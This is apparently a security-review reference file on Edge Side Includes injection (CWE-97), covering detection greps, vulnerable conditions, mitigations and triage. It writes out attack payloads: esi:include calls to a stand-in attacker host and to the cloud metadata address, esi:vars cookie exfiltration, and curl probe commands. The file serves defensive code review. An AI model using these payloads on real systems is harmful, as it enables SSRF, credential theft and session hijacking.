---
name: esi_injection
description: Edge Side Includes (ESI) injection — untrusted input reflected into a response that an ESI-enabled surrogate cache/CDN (Varnish, Squid, Apache Traffic Server, Fastly, Akamai, Oracle Web Cache, F5) parses, letting esi:include fetch attacker/internal URLs (SSRF, cloud-metadata, content injection) and esi:vars exfiltrate HttpOnly cookies/headers (XSS/session theft) (CWE-97). Load when a surrogate/CDN front-end with ESI processing is present.
---

# Edge Side Includes (ESI) Injection (CWE-97)

ESI is a markup language that **surrogate caches / CDNs** (Varnish, Squid, Apache Traffic Server, Fastly, Akamai, Oracle Web Cache, F5) evaluate on the *response* on its way back to the client. It is the same injection class as Server-Side Includes (`ssi_injection.md`), but the parser is the **cache/proxy**, not the origin web server — so the origin application can be fully patched and *still* feed ESI directives to a downstream surrogate that interprets them. When untrusted input is reflected into a response an ESI-enabled surrogate parses, the attacker injects directives that execute on the edge.

## What It Is / Is Not

- **Is**: untrusted input written into a response (or aggregated into a cached fragment) that a fronting surrogate **parses for ESI**, where the `<esi:` directive syntax is not neutralized.
- **Is not**: origin Server-Side Includes (`ssi_injection.md`, parsed by the web server), template-engine injection (`ssti.md`), or browser-interpreted XSS (`xss.md`). ESI is processed by the **surrogate/CDN**, *after* the origin and often *after* the WAF.
- **Reachability precondition**: a surrogate in front of the app with **ESI processing enabled** for the response. Strong signal is the origin emitting `Surrogate-Control: content="ESI/1.0"` (per-response opt-in) or the cache config enabling ESI globally (`esi on`, `do_esi`, `EnableEsi`). Without an ESI-processing surrogate the directives are inert text — downgrade to NEEDS CONTEXT.

## Source → Sink Pattern

Taint flows from a request source to a response body that the surrogate ESI-parses.

- **Sources**: query/body/header/cookie params, uploaded filenames/content, stored values later rendered, any value reflected or aggregated into a cacheable/surrogate-processed response.
- **Sinks**: writing tainted data into a response that a fronting surrogate parses for `<esi:` directives; values reflected into pages that are later cached/aggregated and re-served to other viewers.

## Attacker Primitives

- `<esi:include src="http://attacker.tld/" />` — surrogate fetches an attacker/internal URL and **inlines the body** → **SSRF** (from inside the cache's network) plus content/HTML injection. Pointed at `http://169.254.169.254/latest/meta-data/` or internal services, it reads **cloud metadata / internal pages** (cross-ref `ssrf.md`).
- `<esi:include src="http://internal/" stylesheet="..."/>` on XSLT-capable processors → **XSLT/transform abuse** (cross-ref `xxe.md` — transform RCE / file access on processors that support it).
- `<esi:vars>$(HTTP_COOKIE)</esi:vars>` / `$(QUERY_STRING)` — many ESI processors do **not** honor HttpOnly, so ESI vars exfiltrate cookies/headers → effectively **XSS / session theft** even where the browser would have blocked script access (cross-ref `xss.md`).
- **Cache/WAF bypass**: because ESI is processed *after* the WAF and the surrogate usually cannot distinguish origin-authored from reflected ESI, an `<esi:` payload that survives into a cached or aggregated response can hit **every later viewer** (cross-ref `web_cache_deception.md`).

## Recon Indicators (Grep)

```bash
# Origin opting responses into ESI, or proxy config enabling it
rg -ni 'Surrogate-Control|content="ESI' --glob '*.{conf,vcl,py,js,ts,go,java,rb,php,cs}'
rg -ni '\besi\s+on\b|do_esi|esi_parse|\.esi\(|EnableEsi|x-esi' --glob '*.{vcl,conf,toml,yaml,yml}'
# Reflected/aggregated content that may carry esi tags downstream
rg -ni '<esi:(include|vars|inline|choose|assign|eval)' --glob '*.{html,jsp,php,erb,vcl}'
# User input reflected into a response served through an ESI surrogate
rg -ni 'getParameter|req\.(query|body|params)|request\.(args|form|GET|POST)' -C2 | rg -i 'esi|surrogate'
```

High-signal: request data lands in a response **and** a fronting Varnish/Squid/ATS/CDN has ESI enabled (`Surrogate-Control: content="ESI/1.0"` in the response, or `esi on`/`do_esi`) **and** `<esi:` is not stripped/encoded from reflected/user data.

## Vulnerable Conditions

- An app reflects a query/body param into the page body, and a fronting Varnish/CDN has ESI enabled → `?q=<esi:include src="http://169.254.169.254/latest/meta-data/" />` is fetched by the cache.
- User-influenced content is aggregated into a cached fragment that the surrogate ESI-parses and re-serves to other users.
- ESI enabled globally on a surrogate that fronts any endpoint reflecting untrusted input.
- ESI processor configured with variable access to cookies/headers (`esi:vars` over `$(HTTP_COOKIE)`).

## Safe Patterns

- **Do not enable ESI** on responses that contain user-influenced content; scope ESI processing to fully origin-authored fragments only.
- If ESI is required, **restrict `esi:include` targets to a fixed allowlist** of internal hosts/paths and disable arbitrary `src` URLs.
- **Strip/encode `<esi:` (and `$(`) from reflected/stored user data** before it can reach a surrogate-parsed response (HTML-encode `<`, `>`, `&`; specifically neutralize `<esi:`).
- **Disable ESI variable access to cookies/headers** so `esi:vars` cannot read `$(HTTP_COOKIE)`.
- Strip inbound `Surrogate-Control`/`Surrogate-Capability` from untrusted clients at the edge so a client cannot opt a response into ESI.

## Severity / Triage

- `<esi:include>` reachable on an ESI-enabled surrogate → **High/Critical** (SSRF to internal/metadata; content injection to every cached viewer).
- `<esi:vars>` cookie/header exfiltration reachable → **High** (session theft, HttpOnly bypass).
- Reflected input on a surrogate-fronted page but ESI not confirmed enabled → **NEEDS CONTEXT** (cap Low until ESI config verified).

## Dynamic Test / PoC

```bash
# Reflect an esi:vars probe; if the surrogate evaluates it, the date/var renders instead of literal text
curl -s "https://target/?q=<esi:vars>\$(QUERY_STRING)</esi:vars>"
# Benign include to a controlled collaborator host; a hit confirms edge-side fetch (SSRF)
curl -s "https://target/?q=<esi:include%20src=%22http://collaborator.example/%22/>"
```
Confirmed when the directive is **evaluated by the surrogate** (variable expanded / include fetched) rather than echoed verbatim.

## Common False Alarms

- `<esi:...>` strings in responses served through a surrogate with ESI **disabled** — inert text.
- Reflected input HTML-encoded before output (`&lt;esi:` in the response) — delimiters neutralized.
- ESI directives in fully origin-authored templates with no user-influenced `src`/vars — by design.

## Cross-References

- `ssi_injection.md` — origin-parsed Server-Side Includes (same class, different parser).
- `ssrf.md` — `esi:include` is an outbound-fetch sink (internal/metadata reach).
- `xss.md` — `esi:vars` cookie/header exfiltration (HttpOnly bypass).
- `web_cache_deception.md` — surrogate/edge caches; aggregated/cached responses re-served to others.
- `xxe.md` — XSLT/transform abuse on ESI processors that support stylesheets.

## Core Principle

Never let untrusted input reach a response that an ESI-enabled surrogate parses; scope ESI to origin-authored fragments, allowlist `esi:include` targets, and deny `esi:vars` access to cookies/headers.
